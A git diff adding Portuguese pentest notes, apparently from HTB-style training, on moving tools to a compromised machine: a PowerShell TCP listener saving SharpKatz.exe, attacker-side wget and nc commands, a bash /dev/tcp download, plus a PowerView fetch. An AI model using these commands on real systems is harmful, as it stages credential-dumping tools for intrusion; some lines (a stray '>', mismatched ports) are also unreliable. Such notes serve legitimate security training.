@@ -332,6 +332,56 @@ ou
 cscript.exe /nologo wget.vbs https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView2.ps1
 ```
 
+# Outros
+
+- Netcat 
+
+Netcat (frequentemente abreviado para nc) é um utilitário de rede de computadores para ler e gravar em conexões de rede usando TCP ou UDP, o que significa que podemos usá-lo para operações de transferência de arquivos.
+Na maquina da vitima windows via powershell
+```
+victim@target:~$ $port = 4444
+$listener = [System.Net.Sockets.TcpListener]::new([System.Net.IPAddress]::Any, $port)
+$listener.Start()
+$client  = $listener.AcceptTcpClient()
+$stream  = $client.GetStream()
+$stream.ReadTimeout = 5000
+$buffer  = New-Object byte[] 4096
+$file    = [System.IO.File]::Open("C:\Users\Public\SharpKatz.exe",'Create')
+
+while ($true) {
+    try {
+        $read = $stream.Read($buffer, 0, $buffer.Length)
+        if ($read -le 0) { break }
+        $file.Write($buffer, 0, $read)
+    } catch {
+        break
+    }
+}
+
+$file.Close()
+$stream.Close()
+$client.Close()
+$listener.Stop()
+
+```
+
+- No Host de ataque linux
+
+```
+Gust4vo@htb[/htb]$ wget -q https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe
+
+Gust4vo@htb[/htb]$ nc -q 0 192.168.49.128 8000 < SharpKatz.exe
+```
+
+- Se não tivermos Netcat ou Ncat em nossa máquina comprometida, o Bash suporta operações de leitura/gravação em um arquivo de pseudodispositivo /dev/TCP/.
+Escrever neste arquivo específico faz com que o Bash abra uma conexão TCP para host:port, e esse recurso pode ser usado para transferências de arquivos.
+
+```
+victim@target:~$ cat < /dev/tcp/>10.10.15.156/8000 > SharpKatz.exe
+```
+
+
+
 # 🛡️ Disclaimer 
 
 This repository was created **for educational and cybersecurity research purposes only**.  
